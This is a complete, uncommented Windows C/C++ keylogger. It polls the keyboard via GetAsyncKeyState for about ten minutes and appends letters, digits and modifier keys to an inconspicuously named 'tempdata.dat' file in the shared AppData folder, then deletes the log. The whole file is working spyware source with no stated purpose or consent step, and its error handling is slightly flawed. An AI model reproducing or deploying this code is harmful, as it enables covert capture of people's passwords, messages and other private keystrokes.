#include <Windows.h>
#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")
#include "shlobj.h"


const char logfilename[] = "tempdata.dat";

BOOL DeleteLog() {
	CHAR szPath[MAX_PATH];

	if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, szPath)))
		PathAppendA(szPath, logfilename);

	return DeleteFileA(szPath);
}

BOOL WriteLog(LPCSTR lpBuffer) {
	HANDLE hLogFile;
	DWORD numberOfBytesWritten;
	CHAR szPath[MAX_PATH];
	DWORD dwMoved;
	BOOL result;

	if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, szPath)))
		PathAppendA(szPath, logfilename);

	hLogFile = CreateFileA(szPath, FILE_APPEND_DATA, 0x0, nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (!hLogFile)
		return FALSE;

	dwMoved = SetFilePointer(hLogFile, 0l, nullptr, FILE_END);
	if (dwMoved == INVALID_SET_FILE_POINTER)
		return FALSE;

	result = WriteFile(hLogFile, lpBuffer, strlen(lpBuffer), &numberOfBytesWritten, NULL);

	CloseHandle(hLogFile);

	return result;
}

INT APIENTRY WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {

	size_t iterations = 60000;

	WriteLog("=== LOG BEGIN ===\n");

	while (--iterations) {

		Sleep(10);

		for (size_t key = 'A'; key <= 'Z'; ++key)
			if (GetAsyncKeyState(key) == 0xFFFF8001)
				WriteLog((LPCSTR)&key);

		for (size_t key = '0'; key <= '9'; ++key)
			if (GetAsyncKeyState(key) == 0xFFFF8001)
				WriteLog((LPCSTR)&key);

		if (GetAsyncKeyState(VK_SPACE) == 0xFFFF8001)
			WriteLog("[SPACE]");

		if (GetAsyncKeyState(VK_SHIFT) == 0xFFFF8001)
			WriteLog("[SHIFT]");

		if (GetAsyncKeyState(VK_LWIN) == 0xFFFF8001)
			WriteLog("[WIN]");

		if (GetAsyncKeyState(VK_CONTROL) == 0xFFFF8001)
			WriteLog("[CTRL]");

		if (GetAsyncKeyState(VK_RETURN) == 0xFFFF8001)
			WriteLog("[ENTER]\n");

	}

	WriteLog("=== LOG END ===\n");

	DeleteLog();

	return ERROR_SUCCESS;
}